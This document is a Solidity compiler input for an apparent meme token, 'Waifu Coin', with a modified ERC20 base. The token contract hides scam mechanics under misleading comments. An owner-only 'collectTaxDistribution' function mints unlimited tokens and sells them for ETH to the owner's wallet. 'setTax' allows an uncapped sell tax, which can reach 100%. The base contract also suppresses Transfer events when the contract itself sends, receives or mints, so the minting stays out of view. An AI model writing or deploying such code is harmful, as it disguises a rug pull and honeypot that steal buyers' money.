{{

  "language": "Solidity",

  "sources": {

    "contracts/ERC20.sol": {

      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\nabstract contract ERC20 {\n    \n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    address public admin;\n\n    address public taxWallet;\n\n    address public uniswapV2Pair;\n\n    uint256 public taxPercent;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address => uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n\n        address msgSender = msg.sender;\n        admin = msgSender;\n        taxWallet = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        if(msg.sender != address(this))\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        if(taxPercent > 0 && to == uniswapV2Pair && from != address(this)){\n            uint256 fee = (amount / 100) * taxPercent;\n            // Cannot overflow because the sum of all user\n            // balances can't exceed the max uint256 value.\n            unchecked {\n                balanceOf[address(this)] += fee;\n            }\n            amount = amount - fee;\n        }\n        \n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        if(from != address(this))\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner's nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        if(to != address(this))\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        // Cannot underflow because a user's balance\n        // will never be larger than the total supply.\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        if(from != address(this))\n        emit Transfer(from, address(0), amount);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        OWNABLE LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    modifier onlyOwner() {\n        require(admin == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(admin, address(0));\n        admin = address(0);\n    }\n}"

    },

    "contracts/interfaces.sol": {

      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}"

    },

    "contracts/Token.sol": {

      "content": "//SPDX-License-Identifier: UNLICENSED\n\n/**\n *  _       _____    ____________  __\n * | |     / /   |  /  _/ ____/ / / /\n * | | /| / / /| |  / // /_  / / / / \n * | |/ |/ / ___ |_/ // __/ / /_/ /  \n * |__/|__/_/  |_/___/_/    \\____/   \n * \n * A project for the culture.\n * \n * https://waifucoin.money\n *                             \n * Supply: 4,206,942,069\n * \n */\n\npragma solidity ^0.8.9;\n\nimport \"./ERC20.sol\";\nimport \"./Uniswap.sol\";\nimport \"./interfaces.sol\";\n\ncontract Token is ERC20{\n    \n    bool private tradingOpen;\n\n    IUniswapV2Router02 private uniswapV2Router;\n    \n    /**\n     * Contract initialization.\n     */\n    constructor() ERC20(\"Waifu Coin\", \"WAIFU\", 4) {\n        _mint(msg.sender, 84_138_841_3800);\n        // Team distribution\n        _mint(address(this), 4_122_803_227_6200);\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n\n    function openTrading() external onlyOwner() {\n        require(!tradingOpen,\"trading is already open\");\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;\n\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\n\n        tradingOpen = true;\n    }\n    /**\n     * Swap and send to tax distributor - allows LP staking contracts to reward stakers in ETH.\n     */ \n    function collectTaxDistribution(uint256 tokenAmount) external onlyOwner{\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();       \n        \n        _mint(address(this), tokenAmount);\n        allowance[address(this)][address(uniswapV2Router)] = tokenAmount;\n\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            taxWallet,\n            block.timestamp\n        );\n    }\n\n    /**\n     * Burn and increase value of LP positions - dynamically set in LP staking contracts. \n     */\n    function setTax(uint256 newTax) external onlyOwner() {\n        taxPercent = newTax;\n    }\n\n}\n"

    },

    "contracts/Uniswap.sol": {

      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n"

    }

  },

  "settings": {

    "optimizer": {

      "enabled": false,

      "runs": 200

    },

    "outputSelection": {

      "*": {

        "*": [

          "evm.bytecode",

          "evm.deployedBytecode",

          "devdoc",

          "userdoc",

          "metadata",

          "abi"

        ]

      }

    },

    "libraries": {}

  }

}}